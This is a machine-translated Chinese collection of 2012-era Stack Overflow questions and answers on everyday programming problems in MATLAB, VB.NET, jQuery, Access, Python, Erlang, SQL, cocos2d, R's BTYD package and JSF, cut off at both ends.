我想做一些事情，比如找根，最好不要每次都重写程序。

编辑：我在看lua。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-11-09T18:40:24.013

这在动态语言中肯定要容易得多。例如，在 Matlab 中，您可以使用`eval`命令评估字符串。

但是，这在 C++ 中并非不可能。您也许可以结合使用[C++11 lambda](http://www.cprogramming.com/c++11/c++11-lambda-closures.html)和自定义解释器来制作一个不错的解决方案。成员函数可以将 lambda 作为参数，您可以通过解释字符串来制定 lambda。

这个答案可能会给你一个很好的起点来解释挑战的部分。

[从字符串计算数学函数](https://stackoverflow.com/questions/9977045/evaluate-mathematical-function-from-string)

# matlab - MATLAB - 矩阵维度必须一致（尽管它们是“一致的”！）

> ID：13313851
> 
> 赞同：1
> 
> 时间：2012-11-09T18:27:39.790
> 
> 标签：matlab, vector, matrix

这是代码：

```
fs = 22050;
x = rand(fs,1);
x = x - mean(x); % get rid of DC offeset

% set comb-filter coefficients
f = 220; % fundamental
L = round(fs/f); % delay length 
coef = 0.99; % IIR coefficient

% build delay vector and filter 
b = [1 zeros(1,L-1) coef];
y = filter(1, b, x);

% create amplitude envelope for output 
decay = 8;
expEnv = exp ((0:(length(y)-1))/length(y));
expEnv = (1./expEnv).^ decay;
fprintf('%d\n',length(expEnv));
fprintf('%d\n', length(y));

% envelope output signal
z = y .* expEnv;
sound(z , fs); % play sound 
```

它拒绝执行 z = y.*expEnv 行。printf 行显示 y 和 expEnv 的长度相同（22050）

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-11-09T18:32:33.820

是的……`length`命令的危险。

尽管它们具有相同数量的元素，但它们*的*形状不同：

```
>> size(y)
ans =
       22050           1
>> size(expEnv)
ans =
           1       22050 
```

这将解决：

```
z = y .* expEnv.'; 
```

# javascript - 我应该测试对 javascript 图像对象的支持吗？

> ID：13313859
> 
> 赞同：2
> 
> 时间：2012-11-09T18:28:14.763
> 
> 标签：javascript, object-detection

我刚刚开始使用对象检测来确保某些 javascript 对象支持，例如：XMLHttpRequest。我是否应该测试所有 javascript 对象，包括看似无处不在的对象，例如 Image？

# vb.net - 设置为 AS NEW 时 Redim（已声明？）变量

> ID：13313866
> 
> 赞同：-1
> 
> 时间：2012-11-09T18:28:45.373
> 
> 标签：vb.net

嘿，我一直在努力寻找一些关于如何去做这件事的资源，但我找不到任何东西，因为，真的，我一开始真的不知道它会被称为什么。

有问题的代码是这样的：

```
Dim updateCmd As New SqlCommand(sql, myCONN) 
```

有几个地方我需要在 IF THEN 结构内使用它。

但是，当我在 IF THEN 结构之外将其调暗时，它会告诉我（在 IF THEN 内部）它没有声明。

所以完整的例子是这样的：

```
If alreadyCreatedSettingsTable = False Then
   Dim updateCmd As New SqlCommand(sql, myCONN)

   updateCmd.Parameters.Add("@urlLink", SqlDbType.VarChar)
End If

rssItems = rssDoc.SelectNodes("rss/channel/item")

For i = 0 To rssItems.Count - 1
   rssDetail = rssItems.Item(i).SelectSingleNode("link")

   If rssDetail.Equals(Nothing) = False Then
      rssLink = rssDetail.InnerText.Trim
      updateCmd.Parameters("@urlLink").Value = rssLink
   End If
etc.... 
```

**If alreadyCreatedSettingsTable = False Then** dim 对于 updateCmd.Parameters.Add 工作得很好，但是**当**它在**For i = 0 To rssItems.Count - 1**内时，它告诉我它没有被取消校准。

无论如何，我怎样才能在任何地方使用它并重新调整它？

我试过了

```
Dim updateCmd 
```

But i then do not know how to set **As New SqlCommand(sql, myCONN)** since its already been Dim'ed already?

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-11-09T18:31:06.333

`Dim` declares a variable. `As New` is just syntactic sugar; the scope of the variable is inside that `If` block. Declare it outside and initialize it inside:

```
Dim updateCmd As SqlCommand

If alreadyCreatedSettingsTable = False Then
   sql = "UPDATE jotSettings " & _
                        "etc etc...."

   updateCmd = New SqlCommand(sql, myCONN)

   updateCmd.Parameters.Add("@urlLink", SqlDbType.VarChar)
End If

rssItems = rssDoc.SelectNodes("rss/channel/item")

For i = 0 To rssItems.Count - 1
   rssDetail = rssItems.Item(i).SelectSingleNode("link")

   If rssDetail.Equals(Nothing) = False Then
      rssLink = rssDetail.InnerText.Trim
      updateCmd.Parameters("@urlLink").Value = rssLink
   End If 
```

Also, please *never* write `= False`; use `Not` instead. Or, in the case of `rssDetail.Equals(Nothing) = False`, you almost certainly want `rssDetail IsNot Nothing` instead.

Finally, as written, this is pointless. If `alreadyCreatedSettingsTable` is `True`, you'll get a `NullReferenceException` when you use `updateCmd.Parameters("@urlLink")`. It seems to me that it's something that should be declared outside of a loop, or at class level - though that's just a guess.

P.S. Why are you overwriting `updateCmd.Parameters("@urlLink")` every time? That's wasteful.

# jquery - 从 JQuery Datepicker 中消失的自定义按钮

> ID：13313867
> 
> 赞同：2
> 
> 时间：2012-11-09T18:28:47.337
> 
> 标签：jquery, jquery-ui, jquery-ui-datepicker

我大致按照以下建议向 Jquery UI datepicker 添加了两个按钮： [jQuery datepicker added custom button](https://stackoverflow.com/questions/9894032/jquery-datepicker-adding-custom-button)

我基本上想在标题中添加两个按钮或双箭头以在年份之间进行更改（是的，我知道有一个 changeYear 属性，但我真的需要那些箭头）。我的代码在这里：

[jsfiddle](http://jsfiddle.net/odiseo/EuBgE/)

```
var dates = $("#fromDate").datepicker({
changeYear: true,
beforeShow: function(input) {
    setTimeout(function() {
        var widgetHeader = $(input).datepicker("widget").find(".ui-datepicker-header");
        var prevYrBtn = $('<button title="PrevYr">&lt;&lt; Prev Year</button>');
        prevYrBtn.unbind("click").bind("click", function() {
            $.datepicker._adjustDate($(input), -1, 'Y');

        });
        var nextYrBtn = $('<button title="NextYr">Next year &gt;&gt;</button>');
        nextYrBtn.unbind("click").bind("click", function() {
            $.datepicker._adjustDate($(input), +1, 'Y');

        });
        prevYrBtn.appendTo(widgetHeader);
        nextYrBtn.appendTo(widgetHeader);

    }, 1);
}
}); 
```

​</p>

一切似乎都正常，但是，当您单击任何 << 或 >> 按钮时，这些按钮就会消失。有人可以帮我将它们永久保存在小部件中吗？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-11-13T21:24:17.173

我设法解决了这个问题，请检查：

[http://jsfiddle.net/odiseo/EuBgE/20/](http://jsfiddle.net/odiseo/EuBgE/20/)

```
<label for="from">From</label>
<input type="text" id="fromDate" name="fromDate"/>

var inputDate = $("#fromDate");
var changeYearButtons = function() {
    setTimeout(function() {
        var widgetHeader = inputDate.datepicker("widget").find(".ui-datepicker-header");
        //you can opt to style up these simple buttons tho
        var prevYrBtn = $('<button title="PrevYr">&lt;&lt; Prev Year</button>');
        prevYrBtn.bind("click", function() {
            $.datepicker._adjustDate(inputDate, -1, 'Y');
        });
        var nextYrBtn = $('<button title="NextYr">Next year &gt;&gt;</button>');
        nextYrBtn.bind("click", function() {
            $.datepicker._adjustDate(inputDate, +1, 'Y');

        });
        prevYrBtn.appendTo(widgetHeader);
        nextYrBtn.appendTo(widgetHeader);

    }, 1);
};

var dates = $("#fromDate").datepicker({
    beforeShow: changeYearButtons,
    onChangeMonthYear: changeYearButtons
});​ 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-11-09T19:10:35.263

使它：

```
var dates = $("#fromDate").datepicker({
        changeMonth: true,
        changeYear: true,
        yearRange: "-120:+0",
         dateFormat: "d/m/yy",
beforeShow: function(input) {
    setTimeout(function() {
        var widgetHeader = $(input).datepicker("widget").find(".ui-datepicker-header");
        var prevYrBtn = $('<button title="PrevYr">&lt;&lt; Prev Year</button>');
        prevYrBtn.unbind("click").bind("click", function() {
            $.datepicker._adjustDate($(input), -1, 'Y');

        });
        var nextYrBtn = $('<button title="NextYr">Next year &gt;&gt;</button>');
        nextYrBtn.unbind("click").bind("click", function() {
            $.datepicker._adjustDate($(input), +1, 'Y');

        });
        prevYrBtn.appendTo(widgetHeader);
        nextYrBtn.appendTo(widgetHeader);

    }, 1);
}
}); 
```

你可以删除：changeMonth: true，如果你不需要它。

属性：yearRange: "-120:+0" 用于选择年份的范围，例如-120 +0 用于选择生日，因为您不能选择未来的日期（+ 为0）

并更改日期格式，您可以使用例如：dd-mm-yy、mm/dd/yy 等。

**如果您想**查看**图像（箭头）**，您必须从这里下载它 jqueryui.com/download/ ，在此页面中删除所有复选框，仅选择 datepicker，选择您的设计，下载并将图像文件夹放入datepicker css文件的同一个文件夹..

# ms-access - 从匹配记录中返回特定字段

> ID：13313872
> 
> 赞同：2
> 
> 时间：2012-11-09T18:29:21.330
> 
> 标签：ms-access, select, excel, ms-access-2007, vba

我仍然是 Access 2007 的新手，但在使用来自未绑定文本框的用户输入时，我觉得我缺少对一个概念的理解。

我试图让用户输入记录号（即 A12）并返回匹配记录中的另一个字段（例如“已打开”之类的记录状态）

我正在摆弄 DLookup 以查看它是否可以通过该方法工作，但还没有运气。我可能会研究 SELECT - SQL，但我还没有使用过该功能，并且不确定这是否会给我正在寻找的结果。

如果这是访问编程（或一般数据库）的基本内容，请告诉我在哪里可以阅读此内容。我目前正在使用 MSDN 网站，但示例可以更进一步。

**编辑：**
到目前为止，我的 DLookup 是在 Text12 上的用户更新后发生的

```
Me.Text14.Value = DLookup("[RecordStatus]", "Orders", Text12.Value) 
```

谢谢

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-11-09T18:51:58.897

仔细查看表达式中的第三个选项 ( *Criteria* ) 。`DLookup()`你只给了它`Text12.Value`，我假设它是一个像“A12”这样的字符串值。

*Criteria*参数应该类似于查询中的子句`WHERE`，没有单词`WHERE`。IOW，某些字段的值 =“A12”。如果该字段名为“record_id”，请尝试以下操作：

```
DLookup("RecordStatus", "Orders", "record_id = '" & Me.Text12 & "'") 
```

# python - 在 Python 中是否应将仅包含空格的字符串视为“空”（验证目的）

> ID：13313875
> 
> 赞同：0
> 
> 时间：2012-11-09T18:29:33.513
> 
> 标签：python, string, validation, spaces

我目前正在更新一年前的输入验证库，在查看 IsEmpty() 验证器时，我注意到它看到只有空格的字符串为 NOT EMPTY，如下所示：

```
s = ' ' 
```

这当然是正常的，因为 Python 将带有空格的字符串视为包含值，而不是评估为 None 的真正空字符串。

我的问题是，谁能想到为什么我不应该将带有空格的字符串评估为 EMPTY 以用于验证库的目的？

想法赞赏。

编辑：我正在更新这个以澄清这个问题不打算涵盖特定领域的应用程序。这个库是开源的，我正在更新以造福社区。因此，这个问题更像是一个调查，以听取有关如何实现这一点（以库的方式）以最好地服务 Python 开发人员及其验证需求的建议。我选择了包括 2 种方法来为使用程序提供灵活性。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-11-09T18:32:14.007

这是一个与领域相关的问题——它取决于每个应用程序。

我建议有两个函数，一个默认一种方式，另一个默认另一种方式，每个函数都有一个关键字参数来选择其他行为。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-11-09T18:49:03.923

> 谁能想到为什么我不应该出于验证库的目的将带有空格的字符串评估为 EMPTY 的原因？

在不做某事的理由之前，你需要一个理由去做某事。

除非您有理由，否则随意执行诸如空间修剪之类的操作是没有任何意义的。

额外的操作 ~= 额外的代码行 ~= 额外的 CPU 时间等。

# java - 如何在 Java 中验证 gmail 地址

> ID：13313877
> 
> 赞同：2
> 
> 时间：2012-11-09T18:29:39.923
> 
> 标签：java, google-app-engine, validation, gmail

如何验证给定的 gmail 地址是否有效？

我不是要求一个脚本来检查验证，也不是任何正则表达式。我只需要知道一个人是否在验证框中输入了有效的 gmail 地址。一些代码检查谷歌的数据库，看看它是否是一个有效的 gmail 地址。就像我们注册一个新的 gmail 地址时一样，它会显示一条消息，说 gmail 地址已经存在。如果可以使用一些 Google API for Java 来做到这一点？我想在 GAE 中使用它。

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-11-09T18:49:32.660

> 如果有人将 gmail 地址放在“验证”文本框中，那么我可以使用什么代码来检查谷歌的数据库并告诉我这是否是有效的 ID？

我希望没有办法，因为 gmail 不应该不遗余力地将[电子邮件地址列表收集到垃圾邮件中](http://en.wikipedia.org/wiki/Directory_Harvest_Attack)：

> 目录收集攻击或 DHA 是垃圾邮件发送者使用的一种技术，试图通过蛮力在域中查找有效/存在的电子邮件地址。该攻击通常通过标准字典攻击来执行，其中有效的电子邮件地址是通过暴力破解使用常见用户名的不同排列猜测域中的有效电子邮件地址来找到的。这些攻击对于查找公司的电子邮件地址更有效，因为它们可能具有官方电子邮件别名的标准格式（即 jdoe@example.domain、johnd@example.domain 或 johndoe@example.domain）。

任何可以让您判断字符串是否是指向真实帐户的 gmail 地址的 API 只会让垃圾邮件发送者更容易向该用户发送垃圾邮件。

* * *

> 如果不是，那么什么是安全的验证方式？

向他们发送一封包含 URL 的电子邮件，他们可以单击该 URL 以确认他们拥有该电子邮件地址。

该链接应包含您存储在数据库中的[随机数](http://en.wikipedia.org/wiki/Cryptographic_nonce)以及电子邮件地址或您已签名的一些信息，以便您知道它来自您。

这种帐户验证是非常标准的。

# erlang - Erlang 使用 Rebar 部署，hipe 错误 {"init terminating in do_boot",{'cannot load',hipe,get_file}}

> ID：13313878
> 
> 赞同：4
> 
> 时间：2012-11-09T18:29:41.813
> 
> 标签：erlang, rebar, hipe

对 Erlang 来说非常新，任何尝试使用 rebar 运行简单的 hello world 程序都会导致以下错误：

```
./rel/mysample/bin/mysample console
Exec: /home/jwong/erlang_examples/mysample/rel/mysample/erts-5.9.2/bin/erlexec -boot   /home/jwong/erlang_examples/mysample/rel/mysample/releases/1/mysample -mode embedded -config   /home/jwong/erlang_examples/mysample/rel/mysample/releases/1/sys.config -args_file    /home/jwong/erlang_examples/mysample/rel/mysample/releases/1/vm.args -- console
Root: /home/jwong/erlang_examples/mysample/rel/mysample
{"init terminating in do_boot",{'cannot load',hipe,get_file}}

Crash dump was written to: erl_crash.dump
init terminating in do_boot () 
```

错误 -init_debug

```
{progress,preloaded}
{progress,kernel_load_completed}
{progress,modules_loaded}
{start,heart}
{start,error_logger}
{start,application_controller}
{progress,init_kernel_started}
{apply,{application,load,[{application,stdlib,[{description,"ERTS  CXC 138 10"},{vsn,"1.18.2"},{id,[]},{modules,[array,base64,beam_lib,binary,c,calendar,dets,dets_server,dets_sup,dets_utils,dets_v8,dets_v9,dict,digraph,digraph_utils,edlin,edlin_expand,epp,eval_bits,erl_bits,erl_compile,erl_eval,erl_expand_records,erl_internal,erl_lint,erl_parse,erl_posix_msg,erl_pp,erl_scan,erl_tar,error_logger_file_h,error_logger_tty_h,escript,ets,file_sorter,filelib,filename,gb_trees,gb_sets,gen,gen_event,gen_fsm,gen_server,io,io_lib,io_lib_format,io_lib_fread,io_lib_pretty,lib,lists,log_mf_h,math,ms_transform,orddict,ordsets,otp_internal,pg,pool,proc_lib,proplists,qlc,qlc_pt,queue,random,re,sets,shell,shell_default,slave,sofs,string,supervisor,supervisor_bridge,sys,timer,unicode,win32reg,zip]},{registered,[timer_server,rsh_starter,take_over_monitor,pool_master,dets]},{applications,[kernel]},{included_applications,[]},{env,[]},{maxT,infinity},{maxP,infinity}]}]}}
{progress,applications_loaded}
{apply,{application,start_boot,[kernel,permanent]}}
Erlang R15B02 (erts-5.9.2) [source] [64-bit] [smp:4:4] [async-threads:0] [kernel-poll:false]

{apply,{application,start_boot,[stdlib,permanent]}}
{apply,{c,erlangrc,[]}}
{progress,started}
Eshell V5.9.2  (abort with ^G) 
```

我正在运行 ubuntu 12.04，使用使用 kerl 编译的 erlang，没有标志选项。我对生成的 reltool.config 所做的唯一修改是将“../../”添加到 lib_dirs。

它看起来非常相似 [this question][1] 但在 reltool.config 中添加“hipe”会导致错误：

```
{'EXIT',{{badmatch,{error,"Illegal option: [{app,mysample,hipe,[{mod_cond,app},{incl_cond,include}]}]"}} 
```

发生了什么事，我该如何解决这个问题？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2015-02-04T10:45:01.830

[事实证明这是链接问题](https://stackoverflow.com/questions/7324556/cannot-start-sample-erlang-release-generated-with-rebar)的完全相同

问题是我在 reltool.config 的错误区域中添加了该行。

钢筋生成：

```
app, mysample, [{mod_cond, app}, {incl_cond, include}]} 
```

在配置中自动。而不是用“hipe”编辑行，或者将它添加到文件的底部，正确的配置是将它添加到 sys 数组中，在生成的应用程序下面，这样它看起来像：

```
{app, mysample, [{mod_cond, app}, {incl_cond, include}]},
{app, hipe, [{incl_cond, exclude}]} 
```

# c# - 与 VB6/ActiveX 库的互操作最近在 WiX 部署中停止工作

> ID：13313880
> 
> 赞同：1
> 
> 时间：2012-11-09T18:29:50.470
> 
> 标签：c#, interop, wix, activex, tfsbuild

作为我的 TFS 团队构建设置的一部分，我们构建了一个 VB6/ActiveX 库，供我们的 C# 主应用程序使用。直到最近，我才从构建服务器上获取 VbLib 的副本，使用 TlbImp 为 Vb6lib 生成互操作并在我的解决方案中引用该互操作（互操作已提交给 TFS）。我们使用 WiX 部署应用程序，直到最近它都运行良好。但是现在在部署时，我们的应用程序并没有通过互操作识别 VB6 库，只有当我们将我们的解决方案直接链接到 Vb6Lib（即没有互操作）时才有效，这很痛苦，因为它正在不断开发，因此 VB6lib 的 guid 继续更改迫使其他开发人员重新链接。

那么...我的互操作出了什么问题？

我正在手动生成和检查互操作，我真的想将其作为构建过程的一部分自动化，有什么想法吗？这是好习惯吗？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-11-20T13:54:24.283

为了纠正我们在 vbp 中打开了二进制兼容性（因此 lib 的 guid 在重新编译时不会改变），我们现在直接引用 vb 库（从而让 VS 生成它自己的互操作）。似乎团队中的某个人在某个时候提交了具有二进制兼容性的 vbp，但 AFAICT 版本控制历史并没有证实这一点，所以我们并不知道它之前是如何工作的，但后来停止了。

# sql - 查找数据集的最少邮政编码算法

> ID：13313881
> 
> 赞同：0
> 
> 时间：2012-11-09T18:29:53.933
> 
> 标签：sql, sql-server

我翻阅了所有美国邮政编码，搜索结果包括每次搜索的多个位置。我现在想弄清楚我需要搜索的最小邮政编码数量，以返回相同的唯一位置结果。例如，邮政编码 12345 返回商店 A、B、C、D，邮政编码 12347 返回 A、B、C，邮政编码 12349 返回 B、C、D；我只想获得 12345，因为它获得了所有商店。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-11-09T19:02:23.883

我假设您的数据包含两列，邮政编码和存储。任何给定的邮政编码和商店都可能在数据中出现多次。

从技术上讲，您要的是一个覆盖集。每个邮政编码“覆盖”一组商店。您正在寻找尺寸最小（邮政编码最少）的覆盖物套装。

很容易得到一个覆盖集。这是一个例子：

```
select distinct zipcode
from (select store, min(zipcode) as zipcode
      from t
      group by store
     ) t 
```

对此的修改可能会让你接近你想要的。对于每个商店，如果您选择覆盖该邮政编码最多商店的邮政编码，您将有一个贪心算法来选择覆盖集。这是一种方法：

```
select distinct zipcode
from (select store, zipcode
      from (select store, zipcode, count(*) as numstores,
                   row_number() over (partition by store order by count(*) desc) as seqnum
            from t
            group by store, zipcode
           ) t
      where seqnum = 1
     ) t 
```

但是，贪心算法不能保证产生最小数量的邮政编码。不幸的是，我认为您的问题的一般解决方案在 SQL 中是不可行的，因为您需要考虑邮政编码的所有组合。然后确定覆盖所有商店的最小的那个。但是，上面的查询可能足以满足您的目的。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-11-09T18:52:56.387

```
Select zip_code,max(stores) from (Select     zip_code,count(1) stores from mytable
Group by zip_code) 
```

# iphone - 创建多个相同的 CCSprite

> ID：13313882
> 
> 赞同：1
> 
> 时间：2012-11-09T18:29:56.323
> 
> 标签：iphone, objective-c, cocos2d-iphone, ccsprite

有没有一种干净有效的方法来创建任意数量的相同 CCSprite？

我真的只需要一个标签来引用它们以便以后删除。

例如，在我的游戏中，我在 HUD 中显示生命数：

```
- (void)displayOneLife
{
    CGPoint positionOne = ccp(90, 450);

    CCSprite *life1 = [CCSprite spriteWithFile:@"life.png"];
    [life1 setPosition:positionOne];
    [life1 setScale:0.5f];
    [self addChild:life1 z:5 tag:1];
}

- (void)displayTwoLives
{
    CGPoint positionOne = ccp(90, 450);
    CGPoint positionTwo = ccp(105, 450);

    CCSprite *life1 = [CCSprite spriteWithFile:@"life.png"];
    CCSprite *life2 = [CCSprite spriteWithFile:@"life.png"];

    [life1 setScale:0.5f];
    [life2 setScale:0.5f];

    [life1 setPosition:positionOne];
    [life2 setPosition:positionTwo];

    [self addChild:life1 z:5 tag:1];
    [self addChild:life2 z:5 tag:2];
}

- (void)displayThreeLives
{
    CGPoint positionOne = ccp(90, 450);
    CGPoint positionTwo = ccp(105, 450);
    CGPoint positionThree = ccp(120, 450);

    CCSprite *life1 = [CCSprite spriteWithFile:@"life.png"];
    CCSprite *life2 = [CCSprite spriteWithFile:@"life.png"];
    CCSprite *life3 = [CCSprite spriteWithFile:@"life.png"];

    [life1 setPosition:positionOne];
    [life2 setPosition:positionTwo];
    [life3 setPosition:positionThree];

    [life1 setScale:0.5f];
    [life2 setScale:0.5f];
    [life3 setScale:0.5f];

    [self addChild:life1 z:5 tag:1];
    [self addChild:life2 z:5 tag:2];
    [self addChild:life3 z:5 tag:3];
} 
```

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-11-09T19:20:34.177

实际上，CCSprite 构造函数在 cocos 的纹理缓存中查找，如果缓存中已经包含该纹理，则 il 会重用其纹理。因此，您可以通过删除 *texture （我相信这里泄露了）进一步简化，只需使用这样做：

```
- (void)displayLifes:(int) nrOfLifes
{
    CGPoint position = ccp(90, 450);    

    for(int i = 1 ; i <= nrOfLifes ; i++)
    {
        CCSprite *life = [CCSprite spriteWithFile:@"life.png"];
        [life setPosition:position];
        [life setScale:0.5f];
        [self addChild:life z:5 tag:i];
         position.x += 15;
    }
} 
```

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-11-09T18:32:24.307

使用您的图像创建一个`CCTexture2D`，然后使用该纹理初始化所有精灵。这样你只加载一次图像。

希望这可以帮助。

编辑：

此外，您可以动态添加它们。像这样：

```
- (void)displayLifes:(int) nrOfLifes
{
    CGPoint position = ccp(90, 450);
    CCTexture2D *texture = [[[CCTexture2D alloc] initWithImage:[UIImage imageNamed:@"life.png"]]autorelease];

    for(int i = 1 ; i <= nrOfLifes ; i++)
    {
         CCSprite *life = [CCSprite spriteWithTexture:texture];
         [life setPosition:position];
         [life setScale:0.5f];
         [self addChild:life z:5 tag:i];

         position.x += 15;
    }
} 
```

干杯!

# r - 在 R（BTYD 包）中构建 Pareto/NBD 模型时出现 cbind 错误

> ID：13313883
> 
> 赞同：3
> 
> 时间：2012-11-09T18:29:57.803
> 
> 标签：r, model, statistics

我正在使用 BTYD 包构建 CLV 模型，但遇到了一个似乎无法解决的障碍。

我一直在仔细遵循[本教程](http://cran.r-project.org/web/packages/BTYD/vignettes/BTYD-walkthrough.pdf)第 2.1 节中的指示。一切似乎都很顺利，直到我到达校准客户-足够的统计矩阵 (cal.cbs)。按照教程中的说明，我使用以下代码生成 cal.cbs：

```
birth.periods <- split.data$cust.data$birth.per
last.dates <- split.data$cust.data$last.date
cal.cbs.dates <- data.frame(birth.periods, last.dates, end.of.cal.period)
cal.cbs <- dc.BuildCBSFromCBTAndDates(cal.cbt, cal.cbs.dates, per="week") 
```

直到最后一行似乎一切正常。R给了我以下信息：

```
> cal.cbs <- dc.BuildCBSFromCBTAndDates(cal.cbt, cal.cbs.dates, per="week")
Started making calibration period CBS...
Finished building CBS.
Warning message:
In cbind(f, r, T) :
  number of rows of result is not a multiple of vector length (arg 2) 
```

我不知道这是否是一笔大交易，因为我不完全确定这意味着什么……我决定忽略它，直到我尝试进行参数估计。这就是发生的事情：

```
> params <- pnbd.EstimateParameters(cal.cbs)
Error in optim(logparams, pnbd.eLL, cal.cbs = cal.cbs, max.param.value = 
    max.param.value,  : 
L-BFGS-B needs finite values of 'fn'
In addition: Warning message:
In log(exp(loga - logb) - 1) : NaNs produced 
```

我真的不知道从这里去哪里。我查看了 pnbd.EstimateParameters 函数的源代码，但我无法弄清楚到底出了什么问题。有人知道我该如何解决这个问题吗？任何建议都将不胜感激，因为我现在完全陷入困境。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-11-04T19:55:27.267

更改此行：

```
tot.cbt <- dc.CreateFreqCBT(elog) 
```

对此：

```
tot.cbt <- dc.CreateFreqCBT(elog.cal) 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-03-29T21:07:37.590

所以我实际上遇到了完全相同的问题，并且我得到了适用于示例数据的代码没有问题......但是对于我自己的数据，我遇到了上述问题......我的想法是 r，值没有与长度上的 f 和 T 值匹配，因此返回错误....想法？

所以我发现了这个问题......基本上你的数据集在长度上不匹配......即向量不是相同长度（行）......你很可能是从原始 elog 而不是 elog 创建 cbt .cal ...试试这个，我相信它会起作用...还请确保清理您的初始NA数据集...

希望这可以帮助！干杯

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2016-04-27T01:08:51.693

当 elog 包含奇数个日期时，可能会发生此错误。在这种情况下，当使用 分割校准期和保持期`dc.ElogToCbsCbt`时，得到的`holdout$cbt`和`cal$cbt`将是不同长度的向量（减一）。

这是 CRAN 中当前 BTYD 包中的一个问题。但是，一种解决方法是在运行之前从您的 elog 中删除一天的事务`dc.ElogToCbsCbt`。

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2014-04-30T00:30:23.270

我得到了与下面相同的错误，但幸运的是我找到了我的案例的原因，我希望它也适用于你。

```
> Error in optim(logparams, pnbd.eLL, cal.cbs = cal.cbs, max.param.value
> = 
>     max.param.value,  :  L-BFGS-B needs finite values of 'fn' 
```

数据 cal.cbs 包含三列：x、tx、T.cal。确保 x<=T.cal，即您的交易不能超过观察用户的时间段总数。例如，如果您每天有更多交易，则必须将它们合并为一个牵引力。

检查下面的代码是否适合您。

```
> sel = cal.cbs$x < cal.cbs$T.x 
> cal.cbs1 = cal.cbs[sel,]
> params  = pnbd.EstimateParameters(freq.cal.cbs1) 
```

* * *

## 回答 #5

> 赞同：0
> 
> 时间：2013-03-03T05:01:02.213

我浏览了示例代码，一切正常。我认为任何错误都已在最新更新中得到修复。

这是示例中的代码：

```
require(BTYD)
cdnowElog <-system.file("data/cdnowElog.csv", package ="BTYD")
elog <- dc.ReadLines(cdnowElog, cust.idx = 2,date.idx = 3, sales.idx = 5)
elog$date <-as.Date(elog$date,"%Y%m%d")
elog <- dc.MergeTransactionsOnSameDate(elog)
end.of.cal.period <- as.Date("1997-09-30")
elog.cal <- elog[which(elog$date <= end.of.cal.period), ]
split.data <- dc.SplitUpElogForRepeatTrans(elog.cal)
clean.elog <- split.data$repeat.trans.elog
freq.cbt <- dc.CreateFreqCBT(clean.elog)
freq.cbt[1:3, 1:5]
tot.cbt <- dc.CreateFreqCBT(elog)
cal.cbt <- dc.MergeCustomers(tot.cbt, freq.cbt)
birth.periods <- split.data$cust.data$birth.per
last.dates <- split.data$cust.data$last.date
cal.cbs.dates <- data.frame(birth.periods, last.dates,end.of.cal.period)
cal.cbs <- dc.BuildCBSFromCBTAndDates(cal.cbt, cal.cbs.dates,per="week") 
```

* * *

## 回答 #6

> 赞同：0
> 
> 时间：2014-10-17T14:55:39.540

我有同样的错误，我可以通过在下面替换来修复它

> tot.cbt <- dc.CreateFreqCBT(elog.cal) #使用 elog.cal 而不是 elog

但是，我遇到了以下问题：

> 选择 = cal.cbs$x < cal.cbs$Tx

```
 > Error in cal.cbs$x : $ operator is invalid for atomic vectors 
```

> 选择 = cal.cbs$x < cal.cbs$tx

```
 > Error in cal.cbs$x : $ operator is invalid for atomic vectors 
```

在 cal.cbs 中，列是 tx NOT Tx 我不知道这里出了什么问题。有没有人知道如何解决这个问题？谢谢！

* * *

## 回答 #7

> 赞同：0
> 
> 时间：2014-12-24T21:21:21.337

`cal.cbs`是矩阵而不是数据框。

尝试这个：

```
sel = cal.cbs[,1] < cal.cbs[,2]

cal.cbs1 = cal.cbs[(sel=TRUE),]

params  = pnbd.EstimateParameters(freq.cal.cbs1) 
```

* * *

有一个功能可以一次执行所有步骤，从事件日志到 cbs 矩阵步骤。它对我很有效。

数据<-dc.ElogToCbsCbt（elog，per = "week"，T.cal，T.tot = max(elog$date)，merge.same.date = TRUE，cohort.birth.per = T.cal，消散。因子= 1，统计=“频率”）

要获取 cal.cbs 矩阵，请使用：

数据$cal$cbs

* * *

## 回答 #8

> 赞同：0
> 
> 时间：2014-10-25T09:53:38.290

选择 = cal.cbs$x < cal.cbs$Tx

使用 cal.cbs[,1] "< "ca;.cbs[,2] 或转换为数据框并使用 "$"

# jsf - 复合组件的actionListener问题

> ID：13313885
> 
> 赞同：0
> 
> 时间：2012-11-09T18:30:05.897
> 
> 标签：jsf, jsf-2, composite-component

我将解释在模板中使用一个复合组件时遇到的问题。

想象一个像这样的视图，它与具有视图范围的通用托管 bean 一起工作。我将它作为参数传递给模板。

```
<?xml version='1.0' encoding='UTF-8' ?> 
<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" 
      "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html xmlns="http://www.w3.org/1999/xhtml"
  xmlns:h="http://java.sun.com/jsf/html"  
  xmlns:f="http://java.sun.com/jsf/core"
  xmlns:ui="http://java.sun.com/jsf/facelets"
  xmlns:c="http://java.sun.com/jsp/jstl/core"
  xmlns:trkal="http://java.sun.com/jsf/composite/trkalcomponents">

  <ui:composition template="/template.xhtml">
      <ui:param name="maisuBean" value="#{genericBean}" />
  </ui:composition>
</html> 
```

模板是这样的。除了其他组件，它还使用一个复合组件。

```
<?xml version='1.0' encoding='UTF-8' ?> 
<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" 
      "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html xmlns="http://www.w3.org/1999/xhtml"
xmlns:h="http://java.sun.com/jsf/html"  
